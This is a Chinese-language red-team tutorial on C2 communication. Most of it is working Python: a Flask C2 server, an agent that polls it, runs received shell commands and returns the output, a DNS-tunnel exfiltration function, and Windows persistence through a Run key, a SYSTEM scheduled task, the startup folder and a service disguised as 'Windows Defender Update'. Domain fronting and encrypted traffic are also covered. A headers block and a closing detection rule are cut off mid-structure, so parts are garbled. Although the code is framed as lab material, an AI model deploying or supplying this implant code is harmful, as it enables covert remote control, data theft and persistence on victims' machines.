## C2 通信协议实现

### HTTP/S C2 通信框架

```python
# C2 服务端 (Python Flask 示例，用于学习协议原理)
from flask import Flask, request, jsonify
import base64, json, uuid, threading
from datetime import datetime

app = Flask(__name__)
agents = {}  # agent_id → {info, tasks, results}
tasks_queue = {}

@app.route("/api/v1/check", methods=["GET", "POST"])
def checkin():
    """Agent 心跳/注册"""
    data = request.get_json(silent=True) or {}
    agent_id = data.get("id") or str(uuid.uuid4())[:8]
    
    if agent_id not in agents:
        agents[agent_id] = {
            "id": agent_id,
            "hostname": data.get("hostname", "unknown"),
            "username": data.get("username", "unknown"),
            "os": data.get("os", "unknown"),
            "pid": data.get("pid", 0),
            "first_seen": datetime.now().isoformat(),
            "last_seen": None,
        }
        print(f"[+] New agent: {agent_id} @ {agents[agent_id]['hostname']}")
    
    agents[agent_id]["last_seen"] = datetime.now().isoformat()
    
    # 返回待执行任务
    pending = tasks_queue.pop(agent_id, [])
    return jsonify({"id": agent_id, "tasks": pending})


@app.route("/api/v1/result", methods=["POST"])
def result():
    """接收任务结果"""
    data = request.get_json()
    agent_id = data.get("id")
    task_id  = data.get("task_id")
    output   = base64.b64decode(data.get("output", "")).decode(errors="replace")
    print(f"[{agent_id}] Task {task_id}:\n{output}")
    return jsonify({"status": "ok"})


def add_task(agent_id, cmd):
    task = {"task_id": str(uuid.uuid4())[:8], "type": "shell", "cmd": cmd}
    tasks_queue.setdefault(agent_id, []).append(task)
    return task["task_id"]


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```

```python
# C2 Agent 端 (Python 示例，演示通信原理)
import requests, subprocess, base64, time, platform, os, uuid

C2_URL   = "http://127.0.0.1:8080"   # 实验室地址
SLEEP    = 5
JITTER   = 2
AGENT_ID = str(uuid.uuid4())[:8]

def checkin():
    return requests.post(f"{C2_URL}/api/v1/check", json={
        "id":       AGENT_ID,
        "hostname": platform.node(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "os":       platform.system(),
        "pid":      os.getpid(),
    }, timeout=10).json()

def send_result(task_id, output):
    requests.post(f"{C2_URL}/api/v1/result", json={
        "id":      AGENT_ID,
        "task_id": task_id,
        "output":  base64.b64encode(output.encode()).decode(),
    }, timeout=10)

def run_task(task):
    if task["type"] == "shell":
        try:
            out = subprocess.check_output(task["cmd"], shell=True,
                                          stderr=subprocess.STDOUT, timeout=30)
            return out.decode(errors="replace")
        except subprocess.CalledProcessError as e:
            return e.output.decode(errors="replace")
        except Exception as e:
            return str(e)
    return "unknown task type"

def main():
    import random
    while True:
        try:
            resp = checkin()
            for task in resp.get("tasks", []):
                output = run_task(task)
                send_result(task["task_id"], output)
        except Exception as e:
            pass
        time.sleep(SLEEP + random.uniform(-JITTER, JITTER))

if __name__ == "__main__":
    main()
```

### DNS C2 通信原理

```python
# DNS 隧道原理演示
import dns.resolver, base64, time

# 数据编码为子域名查询
# data → base64 → 分块 → 子域名查询
# 响应通过 TXT/A 记录返回

def dns_exfil(data: bytes, domain: str):
    """将数据通过DNS查询外带（原理演示）"""
    encoded = base64.b32encode(data).decode().lower().replace("=", "")
    chunk_size = 50  # 每个标签最大63字符
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        query = f"{i}.{chunk}.{domain}"
        try:
            dns.resolver.resolve(query, "A")
        except Exception:
            pass
        time.sleep(0.1)

# iodine / dnscat2 是成熟的DNS隧道工具
# dnscat2-server domain.lab   # 服务端
# ./dnscat domain.lab         # 客户端
```

## 持久化机制

```python
# Windows 持久化方式（红队靶机演练）

import winreg, os, shutil

# 1. 注册表 Run 键
def reg_persist(exe_path, name="WindowsUpdate"):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

# 2. 计划任务
def schtask_persist(exe_path, name="SystemMaintenance"):
    os.system(f'schtasks /create /tn "{name}" /tr "{exe_path}" '
              f'/sc onlogon /ru SYSTEM /f')

# 3. 启动目录
def startup_persist(exe_path):
    startup = os.path.expandvars(
        r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    shutil.copy(exe_path, os.path.join(startup, "update.exe"))

# 4. 服务
def service_persist(exe_path, name="WinDefUpdate"):
    os.system(f'sc create {name} binPath= "{exe_path}" '
              f'start= auto DisplayName= "Windows Defender Update"')
    os.system(f'sc start {name}')
```

```python
# HTTP 流量伪装
import requests

HEADERS = {

# 使用合法域名作为 C2 前置 (Domain Fronting 原理)
# 请求头 Host 与实际 SNI 不同
# CDN 根据 Host 转发到真实 C2

# 流量加密 (XOR 简单示例)
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# 实际场景用 AES-256-GCM 或 ChaCha20-Poly1305
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def aes_encrypt(data: bytes, key: bytes) -> bytes:
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext

def aes_decrypt(data: bytes, key: bytes) -> bytes:
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)
```

```yaml
title: Sliver C2 Beacon HTTP Pattern

    timeframe: 1m
level: high
```
